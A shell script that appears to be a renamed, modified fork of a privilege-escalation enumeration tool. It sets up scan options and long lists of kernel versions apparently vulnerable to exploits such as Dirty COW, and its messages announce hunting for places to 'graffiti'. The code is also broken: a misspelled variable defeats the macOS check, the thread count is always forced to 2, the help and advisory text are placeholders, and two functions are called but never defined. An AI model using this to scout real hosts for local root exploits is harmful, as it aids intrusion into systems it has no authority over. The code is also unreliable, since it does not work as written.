#!/bin/sh

VERSION="ng"
ADVISORY="blah"

if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
  IAMROOT="1"
  MAXPATH_FIND_W="3"
else
  IAMROOT=""
  MAXPATH_FIND_W="7"
fi

C=$(printf '\033')
RED="${C}[1;31m"
SED_RED="${C}[1;31m&${C}[0m"
GREEN="${C}[1;32m"
SED_GREEN="${C}[1;32m&${C}[0m"
YELLOW="${C}[1;33m"
SED_YELLOW="${C}[1;33m&${C}[0m"
SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
BLUE="${C}[1;34m"
SED_BLUE="${C}[1;34m&${C}[0m"
ITALIC_BLUE="${C}[1;34m${C}[3m"
LIGHT_MAGENTA="${C}[1;95m"
SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
LIGHT_CYAN="${C}[1;96m"
SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
LG="${C}[1;37m" 
SED_LG="${C}[1;37m&${C}[0m"
DG="${C}[1;90m"
SED_DG="${C}[1;90m&${C}[0m"
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"


if uname 2>/dev/null | grep -q 'Darwin' || /usr/bin/uname 2>/dev/null | grep -q 'Darwin'; then sneakyappes="1"; else sneakyapples=""; fi
FAST="1" 
SUPERFAST=""
DISCOVERY=""
PORTS=""
QUIET=""
CHECKS="system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_files,api_keys_regex"
SEARCH_IN_FOLDER=""
ROOT_FOLDER="/"
WAIT=""
PASSWORD=""
NOCOLOR=""
DEBUG=""
AUTO_NETWORK_SCAN=""
EXTRA_CHECKS=""
REGEXES=""
PORT_FORWARD=""
THREADS="$( ( (grep -c processor /proc/cpuinfo 2>/dev/null) || ( (command -v lscpu >/dev/null 2>&1) && (lscpu | grep '^CPU(s):' | awk '{print $2}')) || echo -n 2) | tr -d "\n")"
[ -z "$THREADS" ] && THREADS="2" 
[ -n "$THREADS" ] && THREADS="2" 
[ "$THREADS" -eq "$THREADS" ] 2>/dev/null && : || THREADS="2" 
HELP=$GREEN"snore"

while getopts "h?asd:p:i:P:qo:LMwNDterf:F:" opt; do
  case "$opt" in
    h|\?) printf "%s\n\n" "$HELP$NC"; exit 0;;
    a)  FAST="";EXTRA_CHECKS="1";;
    s)  SUPERFAST=1;;
    d)  DISCOVERY=$OPTARG;;
    p)  PORTS=$OPTARG;;
    i)  IP=$OPTARG;;
    P)  PASSWORD=$OPTARG;;
    q)  QUIET=1;;
    o)  CHECKS=$OPTARG;;
    L)  MACPEAS="";;
    M)  MACPEAS="1";;
    w)  WAIT=1;;
    N)  NOCOLOR="1";;
    D)  DEBUG="1";;
    t)  AUTO_NETWORK_SCAN="1";;
    e)  EXTRA_CHECKS="1";;
    r)  REGEXES="1";;
    f)  SEARCH_IN_FOLDER=$OPTARG;
    	if ! [ "$(echo -n $SEARCH_IN_FOLDER | tail -c 1)" = "/" ]; then 
	  SEARCH_IN_FOLDER="${SEARCH_IN_FOLDER}/"; 
	fi;
    	ROOT_FOLDER=$SEARCH_IN_FOLDER;
	REGEXES="1";
	CHECKS="procs_crons_timers_srvcs_sockets,software_information,interesting_files,api_keys_regex";;
	
    F)  PORT_FORWARD=$OPTARG;;
    esac
done

if [ "$sneakyapples" ]; then SCRIPTNAME="sneakyapples"; else SCRIPTNAME="sneakypenguins"; fi
if [ "$NOCOLOR" ]; then
  C=""
  RED=""
  SED_RED="&"
  GREEN=""
  SED_GREEN="&"
  YELLOW=""
  SED_YELLOW="&"
  SED_RED_YELLOW="&"
  BLUE=""
  SED_BLUE="&"
  ITALIC_BLUE=""
  LIGHT_MAGENTA=""
  SED_LIGHT_MAGENTA="&"
  LIGHT_CYAN=""
  SED_LIGHT_CYAN="&"
  LG=""
  SED_LG="&"
  DG=""
  SED_DG="&"
  NC=""
  UNDERLINED=""
  ITALIC=""
fi


  if [ "$sneakyapples" ]; then
    bash -c "printf 'sneakyapples time'";
  else
    if [ -f "/bin/bash" ]; then
    /bin/bash -c "printf 'sneakypenguins time'";
    else
  echo "sssssh again"
    fi
  fi

echo ""
if [ ! "$QUIET" ]; then print_banner; print_support; fi
printf ${BLUE}"          $SCRIPTNAME-$VERSION ${YELLOW}by Kettn ;)"$NC;
printf ${YELLOW}"ADVISORY: ${BLUE}$ADVISORY\n$NC"
if [ "$IAMROOT" ]; then
  echo "Youre already root cmon now!"
  sleep 3
fi
echo "Running lets determing some places I can graffiti"

kernelB=" 4.0.[0-9]+| 4.1.[0-9]+| 4.2.[0-9]+| 4.3.[0-9]+| 4.4.[0-9]+| 4.5.[0-9]+| 4.6.[0-9]+| 4.7.[0-9]+| 4.8.[0-9]+| 4.9.[0-9]+| 4.10.[0-9]+| 4.11.[0-9]+| 4.12.[0-9]+| 4.13.[0-9]+| 3.9.6| 3.9.0| 3.9| 3.8.9| 3.8.8| 3.8.7| 3.8.6| 3.8.5| 3.8.4| 3.8.3| 3.8.2| 3.8.1| 3.8.0| 3.8| 3.7.6| 3.7.0| 3.7| 3.6.0| 3.6| 3.5.0| 3.5| 3.4.9| 3.4.8| 3.4.6| 3.4.5| 3.4.4| 3.4.3| 3.4.2| 3.4.1| 3.4.0| 3.4| 3.3| 3.2| 3.19.0| 3.16.0| 3.15| 3.14| 3.13.1| 3.13.0| 3.13| 3.12.0| 3.12| 3.11.0| 3.11| 3.10.6| 3.10.0| 3.10| 3.1.0| 3.0.6| 3.0.5| 3.0.4| 3.0.3| 3.0.2| 3.0.1| 3.0.0| 2.6.9| 2.6.8| 2.6.7| 2.6.6| 2.6.5| 2.6.4| 2.6.39| 2.6.38| 2.6.37| 2.6.36| 2.6.35| 2.6.34| 2.6.33| 2.6.32| 2.6.31| 2.6.30| 2.6.3| 2.6.29| 2.6.28| 2.6.27| 2.6.26| 2.6.25| 2.6.24.1| 2.6.24| 2.6.23| 2.6.22| 2.6.21| 2.6.20| 2.6.2| 2.6.19| 2.6.18| 2.6.17| 2.6.16| 2.6.15| 2.6.14| 2.6.13| 2.6.12| 2.6.11| 2.6.10| 2.6.1| 2.6.0| 2.4.9| 2.4.8| 2.4.7| 2.4.6| 2.4.5| 2.4.4| 2.4.37| 2.4.36| 2.4.35| 2.4.34| 2.4.33| 2.4.32| 2.4.31| 2.4.30| 2.4.29| 2.4.28| 2.4.27| 2.4.26| 2.4.25| 2.4.24| 2.4.23| 2.4.22| 2.4.21| 2.4.20| 2.4.19| 2.4.18| 2.4.17| 2.4.16| 2.4.15| 2.4.14| 2.4.13| 2.4.12| 2.4.11| 2.4.10| 2.2.24"
kernelDCW_Ubuntu_Precise_1="3.1.1-1400-linaro-lt-mx5|3.11.0-13-generic|3.11.0-14-generic|3.11.0-15-generic|3.11.0-17-generic|3.11.0-18-generic|3.11.0-20-generic|3.11.0-22-generic|3.11.0-23-generic|3.11.0-24-generic|3.11.0-26-generic|3.13.0-100-generic|3.13.0-24-generic|3.13.0-27-generic|3.13.0-29-generic|3.13.0-30-generic|3.13.0-32-generic|3.13.0-33-generic|3.13.0-34-generic|3.13.0-35-generic|3.13.0-36-generic|3.13.0-37-generic|3.13.0-39-generic|3.13.0-40-generic|3.13.0-41-generic|3.13.0-43-generic|3.13.0-44-generic|3.13.0-46-generic|3.13.0-48-generic|3.13.0-49-generic|3.13.0-51-generic|3.13.0-52-generic|3.13.0-53-generic|3.13.0-54-generic|3.13.0-55-generic|3.13.0-57-generic|3.13.0-58-generic|3.13.0-59-generic|3.13.0-61-generic|3.13.0-62-generic|3.13.0-63-generic|3.13.0-65-generic|3.13.0-66-generic|3.13.0-67-generic|3.13.0-68-generic|3.13.0-71-generic|3.13.0-73-generic|3.13.0-74-generic|3.13.0-76-generic|3.13.0-77-generic|3.13.0-79-generic|3.13.0-83-generic|3.13.0-85-generic|3.13.0-86-generic|3.13.0-88-generic|3.13.0-91-generic|3.13.0-92-generic|3.13.0-93-generic|3.13.0-95-generic|3.13.0-96-generic|3.13.0-98-generic|3.2.0-101-generic|3.2.0-101-generic-pae|3.2.0-101-virtual|3.2.0-102-generic|3.2.0-102-generic-pae|3.2.0-102-virtual"
kernelDCW_Ubuntu_Precise_2="3.2.0-104-generic|3.2.0-104-generic-pae|3.2.0-104-virtual|3.2.0-105-generic|3.2.0-105-generic-pae|3.2.0-105-virtual|3.2.0-106-generic|3.2.0-106-generic-pae|3.2.0-106-virtual|3.2.0-107-generic|3.2.0-107-generic-pae|3.2.0-107-virtual|3.2.0-109-generic|3.2.0-109-generic-pae|3.2.0-109-virtual|3.2.0-110-generic|3.2.0-110-generic-pae|3.2.0-110-virtual|3.2.0-111-generic|3.2.0-111-generic-pae|3.2.0-111-virtual|3.2.0-1412-omap4|3.2.0-1602-armadaxp|3.2.0-23-generic|3.2.0-23-generic-pae|3.2.0-23-lowlatency|3.2.0-23-lowlatency-pae|3.2.0-23-omap|3.2.0-23-powerpc-smp|3.2.0-23-powerpc64-smp|3.2.0-23-virtual|3.2.0-24-generic|3.2.0-24-generic-pae|3.2.0-24-virtual|3.2.0-25-generic|3.2.0-25-generic-pae|3.2.0-25-virtual|3.2.0-26-generic|3.2.0-26-generic-pae|3.2.0-26-virtual|3.2.0-27-generic|3.2.0-27-generic-pae|3.2.0-27-virtual|3.2.0-29-generic|3.2.0-29-generic-pae|3.2.0-29-virtual|3.2.0-31-generic|3.2.0-31-generic-pae|3.2.0-31-virtual|3.2.0-32-generic|3.2.0-32-generic-pae|3.2.0-32-virtual|3.2.0-33-generic|3.2.0-33-generic-pae|3.2.0-33-lowlatency|3.2.0-33-lowlatency-pae|3.2.0-33-virtual|3.2.0-34-generic|3.2.0-34-generic-pae|3.2.0-34-virtual|3.2.0-35-generic|3.2.0-35-generic-pae|3.2.0-35-lowlatency|3.2.0-35-lowlatency-pae|3.2.0-35-virtual"
kernelDCW_Ubuntu_Precise_3="3.2.0-36-generic|3.2.0-36-generic-pae|3.2.0-36-lowlatency|3.2.0-36-lowlatency-pae|3.2.0-36-virtual|3.2.0-37-generic|3.2.0-37-generic-pae|3.2.0-37-lowlatency|3.2.0-37-lowlatency-pae|3.2.0-37-virtual|3.2.0-38-generic|3.2.0-38-generic-pae|3.2.0-38-lowlatency|3.2.0-38-lowlatency-pae|3.2.0-38-virtual|3.2.0-39-generic|3.2.0-39-generic-pae|3.2.0-39-lowlatency|3.2.0-39-lowlatency-pae|3.2.0-39-virtual|3.2.0-40-generic|3.2.0-40-generic-pae|3.2.0-40-lowlatency|3.2.0-40-lowlatency-pae|3.2.0-40-virtual|3.2.0-41-generic|3.2.0-41-generic-pae|3.2.0-41-lowlatency|3.2.0-41-lowlatency-pae|3.2.0-41-virtual|3.2.0-43-generic|3.2.0-43-generic-pae|3.2.0-43-virtual|3.2.0-44-generic|3.2.0-44-generic-pae|3.2.0-44-lowlatency|3.2.0-44-lowlatency-pae|3.2.0-44-virtual|3.2.0-45-generic|3.2.0-45-generic-pae|3.2.0-45-virtual|3.2.0-48-generic|3.2.0-48-generic-pae|3.2.0-48-lowlatency|3.2.0-48-lowlatency-pae|3.2.0-48-virtual|3.2.0-51-generic|3.2.0-51-generic-pae|3.2.0-51-lowlatency|3.2.0-51-lowlatency-pae|3.2.0-51-virtual|3.2.0-52-generic|3.2.0-52-generic-pae|3.2.0-52-lowlatency|3.2.0-52-lowlatency-pae|3.2.0-52-virtual|3.2.0-53-generic"
kernelDCW_Ubuntu_Precise_4="3.2.0-53-generic-pae|3.2.0-53-lowlatency|3.2.0-53-lowlatency-pae|3.2.0-53-virtual|3.2.0-54-generic|3.2.0-54-generic-pae|3.2.0-54-lowlatency|3.2.0-54-lowlatency-pae|3.2.0-54-virtual|3.2.0-55-generic|3.2.0-55-generic-pae|3.2.0-55-lowlatency|3.2.0-55-lowlatency-pae|3.2.0-55-virtual|3.2.0-56-generic|3.2.0-56-generic-pae|3.2.0-56-lowlatency|3.2.0-56-lowlatency-pae|3.2.0-56-virtual|3.2.0-57-generic|3.2.0-57-generic-pae|3.2.0-57-lowlatency|3.2.0-57-lowlatency-pae|3.2.0-57-virtual|3.2.0-58-generic|3.2.0-58-generic-pae|3.2.0-58-lowlatency|3.2.0-58-lowlatency-pae|3.2.0-58-virtual|3.2.0-59-generic|3.2.0-59-generic-pae|3.2.0-59-lowlatency|3.2.0-59-lowlatency-pae|3.2.0-59-virtual|3.2.0-60-generic|3.2.0-60-generic-pae|3.2.0-60-lowlatency|3.2.0-60-lowlatency-pae|3.2.0-60-virtual|3.2.0-61-generic|3.2.0-61-generic-pae|3.2.0-61-virtual|3.2.0-63-generic|3.2.0-63-generic-pae|3.2.0-63-lowlatency|3.2.0-63-lowlatency-pae|3.2.0-63-virtual|3.2.0-64-generic|3.2.0-64-generic-pae|3.2.0-64-lowlatency|3.2.0-64-lowlatency-pae|3.2.0-64-virtual|3.2.0-65-generic|3.2.0-65-generic-pae|3.2.0-65-lowlatency|3.2.0-65-lowlatency-pae|3.2.0-65-virtual|3.2.0-67-generic|3.2.0-67-generic-pae|3.2.0-67-lowlatency|3.2.0-67-lowlatency-pae|3.2.0-67-virtual|3.2.0-68-generic"
kernelDCW_Ubuntu_Precise_5="3.2.0-68-generic-pae|3.2.0-68-lowlatency|3.2.0-68-lowlatency-pae|3.2.0-68-virtual|3.2.0-69-generic|3.2.0-69-generic-pae|3.2.0-69-lowlatency|3.2.0-69-lowlatency-pae|3.2.0-69-virtual|3.2.0-70-generic|3.2.0-70-generic-pae|3.2.0-70-lowlatency|3.2.0-70-lowlatency-pae|3.2.0-70-virtual|3.2.0-72-generic|3.2.0-72-generic-pae|3.2.0-72-lowlatency|3.2.0-72-lowlatency-pae|3.2.0-72-virtual|3.2.0-73-generic|3.2.0-73-generic-pae|3.2.0-73-lowlatency|3.2.0-73-lowlatency-pae|3.2.0-73-virtual|3.2.0-74-generic|3.2.0-74-generic-pae|3.2.0-74-lowlatency|3.2.0-74-lowlatency-pae|3.2.0-74-virtual|3.2.0-75-generic|3.2.0-75-generic-pae|3.2.0-75-lowlatency|3.2.0-75-lowlatency-pae|3.2.0-75-virtual|3.2.0-76-generic|3.2.0-76-generic-pae|3.2.0-76-lowlatency|3.2.0-76-lowlatency-pae|3.2.0-76-virtual|3.2.0-77-generic|3.2.0-77-generic-pae|3.2.0-77-lowlatency|3.2.0-77-lowlatency-pae|3.2.0-77-virtual|3.2.0-79-generic|3.2.0-79-generic-pae|3.2.0-79-lowlatency|3.2.0-79-lowlatency-pae|3.2.0-79-virtual|3.2.0-80-generic|3.2.0-80-generic-pae|3.2.0-80-lowlatency|3.2.0-80-lowlatency-pae|3.2.0-80-virtual|3.2.0-82-generic|3.2.0-82-generic-pae|3.2.0-82-lowlatency|3.2.0-82-lowlatency-pae|3.2.0-82-virtual|3.2.0-83-generic|3.2.0-83-generic-pae|3.2.0-83-virtual|3.2.0-84-generic"
kernelDCW_Ubuntu_Precise_6="3.2.0-84-generic-pae|3.2.0-84-virtual|3.2.0-85-generic|3.2.0-85-generic-pae|3.2.0-85-virtual|3.2.0-86-generic|3.2.0-86-generic-pae|3.2.0-86-virtual|3.2.0-87-generic|3.2.0-87-generic-pae|3.2.0-87-virtual|3.2.0-88-generic|3.2.0-88-generic-pae|3.2.0-88-virtual|3.2.0-89-generic|3.2.0-89-generic-pae|3.2.0-89-virtual|3.2.0-90-generic|3.2.0-90-generic-pae|3.2.0-90-virtual|3.2.0-91-generic|3.2.0-91-generic-pae|3.2.0-91-virtual|3.2.0-92-generic|3.2.0-92-generic-pae|3.2.0-92-virtual|3.2.0-93-generic|3.2.0-93-generic-pae|3.2.0-93-virtual|3.2.0-94-generic|3.2.0-94-generic-pae|3.2.0-94-virtual|3.2.0-95-generic|3.2.0-95-generic-pae|3.2.0-95-virtual|3.2.0-96-generic|3.2.0-96-generic-pae|3.2.0-96-virtual|3.2.0-97-generic|3.2.0-97-generic-pae|3.2.0-97-virtual|3.2.0-98-generic|3.2.0-98-generic-pae|3.2.0-98-virtual|3.2.0-99-generic|3.2.0-99-generic-pae|3.2.0-99-virtual|3.5.0-40-generic|3.5.0-41-generic|3.5.0-42-generic|3.5.0-43-generic|3.5.0-44-generic|3.5.0-45-generic|3.5.0-46-generic|3.5.0-49-generic|3.5.0-51-generic|3.5.0-52-generic|3.5.0-54-generic|3.8.0-19-generic|3.8.0-21-generic|3.8.0-22-generic|3.8.0-23-generic|3.8.0-27-generic|3.8.0-29-generic|3.8.0-30-generic|3.8.0-31-generic|3.8.0-32-generic|3.8.0-33-generic|3.8.0-34-generic|3.8.0-35-generic|3.8.0-36-generic|3.8.0-37-generic|3.8.0-38-generic|3.8.0-39-generic|3.8.0-41-generic|3.8.0-42-generic"
kernelDCW_Ubuntu_Trusty_1="3.13.0-24-generic|3.13.0-24-generic-lpae|3.13.0-24-lowlatency|3.13.0-24-powerpc-e500|3.13.0-24-powerpc-e500mc|3.13.0-24-powerpc-smp|3.13.0-24-powerpc64-emb|3.13.0-24-powerpc64-smp|3.13.0-27-generic|3.13.0-27-lowlatency|3.13.0-29-generic|3.13.0-29-lowlatency|3.13.0-3-exynos5|3.13.0-30-generic|3.13.0-30-lowlatency|3.13.0-32-generic|3.13.0-32-lowlatency|3.13.0-33-generic|3.13.0-33-lowlatency|3.13.0-34-generic|3.13.0-34-lowlatency|3.13.0-35-generic|3.13.0-35-lowlatency|3.13.0-36-generic|3.13.0-36-lowlatency|3.13.0-37-generic|3.13.0-37-lowlatency|3.13.0-39-generic|3.13.0-39-lowlatency|3.13.0-40-generic|3.13.0-40-lowlatency|3.13.0-41-generic|3.13.0-41-lowlatency|3.13.0-43-generic|3.13.0-43-lowlatency|3.13.0-44-generic|3.13.0-44-lowlatency|3.13.0-46-generic|3.13.0-46-lowlatency|3.13.0-48-generic|3.13.0-48-lowlatency|3.13.0-49-generic|3.13.0-49-lowlatency|3.13.0-51-generic|3.13.0-51-lowlatency|3.13.0-52-generic|3.13.0-52-lowlatency|3.13.0-53-generic|3.13.0-53-lowlatency|3.13.0-54-generic|3.13.0-54-lowlatency|3.13.0-55-generic|3.13.0-55-lowlatency|3.13.0-57-generic|3.13.0-57-lowlatency|3.13.0-58-generic|3.13.0-58-lowlatency|3.13.0-59-generic|3.13.0-59-lowlatency|3.13.0-61-generic|3.13.0-61-lowlatency|3.13.0-62-generic|3.13.0-62-lowlatency|3.13.0-63-generic|3.13.0-63-lowlatency|3.13.0-65-generic|3.13.0-65-lowlatency|3.13.0-66-generic|3.13.0-66-lowlatency"
kernelDCW_Ubuntu_Trusty_2="3.13.0-67-generic|3.13.0-67-lowlatency|3.13.0-68-generic|3.13.0-68-lowlatency|3.13.0-70-generic|3.13.0-70-lowlatency|3.13.0-71-generic|3.13.0-71-lowlatency|3.13.0-73-generic|3.13.0-73-lowlatency|3.13.0-74-generic|3.13.0-74-lowlatency|3.13.0-76-generic|3.13.0-76-lowlatency|3.13.0-77-generic|3.13.0-77-lowlatency|3.13.0-79-generic|3.13.0-79-lowlatency|3.13.0-83-generic|3.13.0-83-lowlatency|3.13.0-85-generic|3.13.0-85-lowlatency|3.13.0-86-generic|3.13.0-86-lowlatency|3.13.0-87-generic|3.13.0-87-lowlatency|3.13.0-88-generic|3.13.0-88-lowlatency|3.13.0-91-generic|3.13.0-91-lowlatency|3.13.0-92-generic|3.13.0-92-lowlatency|3.13.0-93-generic|3.13.0-93-lowlatency|3.13.0-95-generic|3.13.0-95-lowlatency|3.13.0-96-generic|3.13.0-96-lowlatency|3.13.0-98-generic|3.13.0-98-lowlatency|3.16.0-25-generic|3.16.0-25-lowlatency|3.16.0-26-generic|3.16.0-26-lowlatency|3.16.0-28-generic|3.16.0-28-lowlatency|3.16.0-29-generic|3.16.0-29-lowlatency|3.16.0-31-generic|3.16.0-31-lowlatency|3.16.0-33-generic|3.16.0-33-lowlatency|3.16.0-34-generic|3.16.0-34-lowlatency|3.16.0-36-generic|3.16.0-36-lowlatency|3.16.0-37-generic|3.16.0-37-lowlatency|3.16.0-38-generic|3.16.0-38-lowlatency|3.16.0-39-generic|3.16.0-39-lowlatency|3.16.0-41-generic|3.16.0-41-lowlatency|3.16.0-43-generic|3.16.0-43-lowlatency|3.16.0-44-generic|3.16.0-44-lowlatency|3.16.0-45-generic"
kernelDCW_Ubuntu_Trusty_3="3.16.0-45-lowlatency|3.16.0-46-generic|3.16.0-46-lowlatency|3.16.0-48-generic|3.16.0-48-lowlatency|3.16.0-49-generic|3.16.0-49-lowlatency|3.16.0-50-generic|3.16.0-50-lowlatency|3.16.0-51-generic|3.16.0-51-lowlatency|3.16.0-52-generic|3.16.0-52-lowlatency|3.16.0-53-generic|3.16.0-53-lowlatency|3.16.0-55-generic|3.16.0-55-lowlatency|3.16.0-56-generic|3.16.0-56-lowlatency|3.16.0-57-generic|3.16.0-57-lowlatency|3.16.0-59-generic|3.16.0-59-lowlatency|3.16.0-60-generic|3.16.0-60-lowlatency|3.16.0-62-generic|3.16.0-62-lowlatency|3.16.0-67-generic|3.16.0-67-lowlatency|3.16.0-69-generic|3.16.0-69-lowlatency|3.16.0-70-generic|3.16.0-70-lowlatency|3.16.0-71-generic|3.16.0-71-lowlatency|3.16.0-73-generic|3.16.0-73-lowlatency|3.16.0-76-generic|3.16.0-76-lowlatency|3.16.0-77-generic|3.16.0-77-lowlatency|3.19.0-20-generic|3.19.0-20-lowlatency|3.19.0-21-generic|3.19.0-21-lowlatency|3.19.0-22-generic|3.19.0-22-lowlatency|3.19.0-23-generic|3.19.0-23-lowlatency|3.19.0-25-generic|3.19.0-25-lowlatency|3.19.0-26-generic|3.19.0-26-lowlatency|3.19.0-28-generic|3.19.0-28-lowlatency|3.19.0-30-generic|3.19.0-30-lowlatency|3.19.0-31-generic|3.19.0-31-lowlatency|3.19.0-32-generic|3.19.0-32-lowlatency|3.19.0-33-generic|3.19.0-33-lowlatency|3.19.0-37-generic|3.19.0-37-lowlatency|3.19.0-39-generic|3.19.0-39-lowlatency|3.19.0-41-generic|3.19.0-41-lowlatency|3.19.0-42-generic"
kernelDCW_Ubuntu_Trusty_4="3.19.0-42-lowlatency|3.19.0-43-generic|3.19.0-43-lowlatency|3.19.0-47-generic|3.19.0-47-lowlatency|3.19.0-49-generic|3.19.0-49-lowlatency|3.19.0-51-generic|3.19.0-51-lowlatency|3.19.0-56-generic|3.19.0-56-lowlatency|3.19.0-58-generic|3.19.0-58-lowlatency|3.19.0-59-generic|3.19.0-59-lowlatency|3.19.0-61-generic|3.19.0-61-lowlatency|3.19.0-64-generic|3.19.0-64-lowlatency|3.19.0-65-generic|3.19.0-65-lowlatency|3.19.0-66-generic|3.19.0-66-lowlatency|3.19.0-68-generic|3.19.0-68-lowlatency|3.19.0-69-generic|3.19.0-69-lowlatency|3.19.0-71-generic|3.19.0-71-lowlatency|3.4.0-5-chromebook|4.2.0-18-generic|4.2.0-18-lowlatency|4.2.0-19-generic|4.2.0-19-lowlatency|4.2.0-21-generic|4.2.0-21-lowlatency|4.2.0-22-generic|4.2.0-22-lowlatency|4.2.0-23-generic|4.2.0-23-lowlatency|4.2.0-25-generic|4.2.0-25-lowlatency|4.2.0-27-generic|4.2.0-27-lowlatency|4.2.0-30-generic|4.2.0-30-lowlatency|4.2.0-34-generic|4.2.0-34-lowlatency|4.2.0-35-generic|4.2.0-35-lowlatency|4.2.0-36-generic|4.2.0-36-lowlatency|4.2.0-38-generic|4.2.0-38-lowlatency|4.2.0-41-generic|4.2.0-41-lowlatency|4.4.0-21-generic|4.4.0-21-lowlatency|4.4.0-22-generic|4.4.0-22-lowlatency|4.4.0-24-generic|4.4.0-24-lowlatency|4.4.0-28-generic|4.4.0-28-lowlatency|4.4.0-31-generic|4.4.0-31-lowlatency|4.4.0-34-generic|4.4.0-34-lowlatency|4.4.0-36-generic|4.4.0-36-lowlatency|4.4.0-38-generic|4.4.0-38-lowlatency|4.4.0-42-generic|4.4.0-42-lowlatency"
kernelDCW_Ubuntu_Xenial="4.4.0-1009-raspi2|4.4.0-1012-snapdragon|4.4.0-21-generic|4.4.0-21-generic-lpae|4.4.0-21-lowlatency|4.4.0-21-powerpc-e500mc|4.4.0-21-powerpc-smp|4.4.0-21-powerpc64-emb|4.4.0-21-powerpc64-smp|4.4.0-22-generic|4.4.0-22-lowlatency|4.4.0-24-generic|4.4.0-24-lowlatency|4.4.0-28-generic|4.4.0-28-lowlatency|4.4.0-31-generic|4.4.0-31-lowlatency|4.4.0-34-generic|4.4.0-34-lowlatency|4.4.0-36-generic|4.4.0-36-lowlatency|4.4.0-38-generic|4.4.0-38-lowlatency|4.4.0-42-generic|4.4.0-42-lowlatency"
kernelDCW_Rhel5_1="2.6.24.7-74.el5rt|2.6.24.7-81.el5rt|2.6.24.7-93.el5rt|2.6.24.7-101.el5rt|2.6.24.7-108.el5rt|2.6.24.7-111.el5rt|2.6.24.7-117.el5rt|2.6.24.7-126.el5rt|2.6.24.7-132.el5rt|2.6.24.7-137.el5rt|2.6.24.7-139.el5rt|2.6.24.7-146.el5rt|2.6.24.7-149.el5rt|2.6.24.7-161.el5rt|2.6.24.7-169.el5rt|2.6.33.7-rt29.45.el5rt|2.6.33.7-rt29.47.el5rt|2.6.33.7-rt29.55.el5rt|2.6.33.9-rt31.64.el5rt|2.6.33.9-rt31.67.el5rt|2.6.33.9-rt31.86.el5rt|2.6.18-8.1.1.el5|2.6.18-8.1.3.el5|2.6.18-8.1.4.el5|2.6.18-8.1.6.el5|2.6.18-8.1.8.el5|2.6.18-8.1.10.el5|2.6.18-8.1.14.el5|2.6.18-8.1.15.el5|2.6.18-53.el5|2.6.18-53.1.4.el5|2.6.18-53.1.6.el5|2.6.18-53.1.13.el5|2.6.18-53.1.14.el5|2.6.18-53.1.19.el5|2.6.18-53.1.21.el5|2.6.18-92.el5|2.6.18-92.1.1.el5|2.6.18-92.1.6.el5|2.6.18-92.1.10.el5|2.6.18-92.1.13.el5|2.6.18-92.1.18.el5|2.6.18-92.1.22.el5|2.6.18-92.1.24.el5|2.6.18-92.1.26.el5|2.6.18-92.1.27.el5|2.6.18-92.1.28.el5|2.6.18-92.1.29.el5|2.6.18-92.1.32.el5|2.6.18-92.1.35.el5|2.6.18-92.1.38.el5|2.6.18-128.el5|2.6.18-128.1.1.el5|2.6.18-128.1.6.el5|2.6.18-128.1.10.el5|2.6.18-128.1.14.el5|2.6.18-128.1.16.el5|2.6.18-128.2.1.el5|2.6.18-128.4.1.el5|2.6.18-128.4.1.el5|2.6.18-128.7.1.el5|2.6.18-128.8.1.el5|2.6.18-128.11.1.el5|2.6.18-128.12.1.el5|2.6.18-128.14.1.el5|2.6.18-128.16.1.el5|2.6.18-128.17.1.el5|2.6.18-128.18.1.el5|2.6.18-128.23.1.el5|2.6.18-128.23.2.el5|2.6.18-128.25.1.el5|2.6.18-128.26.1.el5|2.6.18-128.27.1.el5"
kernelDCW_Rhel5_2="2.6.18-128.29.1.el5|2.6.18-128.30.1.el5|2.6.18-128.31.1.el5|2.6.18-128.32.1.el5|2.6.18-128.35.1.el5|2.6.18-128.36.1.el5|2.6.18-128.37.1.el5|2.6.18-128.38.1.el5|2.6.18-128.39.1.el5|2.6.18-128.40.1.el5|2.6.18-128.41.1.el5|2.6.18-164.el5|2.6.18-164.2.1.el5|2.6.18-164.6.1.el5|2.6.18-164.9.1.el5|2.6.18-164.10.1.el5|2.6.18-164.11.1.el5|2.6.18-164.15.1.el5|2.6.18-164.17.1.el5|2.6.18-164.19.1.el5|2.6.18-164.21.1.el5|2.6.18-164.25.1.el5|2.6.18-164.25.2.el5|2.6.18-164.28.1.el5|2.6.18-164.30.1.el5|2.6.18-164.32.1.el5|2.6.18-164.34.1.el5|2.6.18-164.36.1.el5|2.6.18-164.37.1.el5|2.6.18-164.38.1.el5|2.6.18-194.el5|2.6.18-194.3.1.el5|2.6.18-194.8.1.el5|2.6.18-194.11.1.el5|2.6.18-194.11.3.el5|2.6.18-194.11.4.el5|2.6.18-194.17.1.el5|2.6.18-194.17.4.el5|2.6.18-194.26.1.el5|2.6.18-194.32.1.el5|2.6.18-238.el5|2.6.18-238.1.1.el5|2.6.18-238.5.1.el5|2.6.18-238.9.1.el5|2.6.18-238.12.1.el5|2.6.18-238.19.1.el5|2.6.18-238.21.1.el5|2.6.18-238.27.1.el5|2.6.18-238.28.1.el5|2.6.18-238.31.1.el5|2.6.18-238.33.1.el5|2.6.18-238.35.1.el5|2.6.18-238.37.1.el5|2.6.18-238.39.1.el5|2.6.18-238.40.1.el5|2.6.18-238.44.1.el5|2.6.18-238.45.1.el5|2.6.18-238.47.1.el5|2.6.18-238.48.1.el5|2.6.18-238.49.1.el5|2.6.18-238.50.1.el5|2.6.18-238.51.1.el5|2.6.18-238.52.1.el5|2.6.18-238.53.1.el5|2.6.18-238.54.1.el5|2.6.18-238.55.1.el5|2.6.18-238.56.1.el5|2.6.18-274.el5|2.6.18-274.3.1.el5|2.6.18-274.7.1.el5|2.6.18-274.12.1.el5"
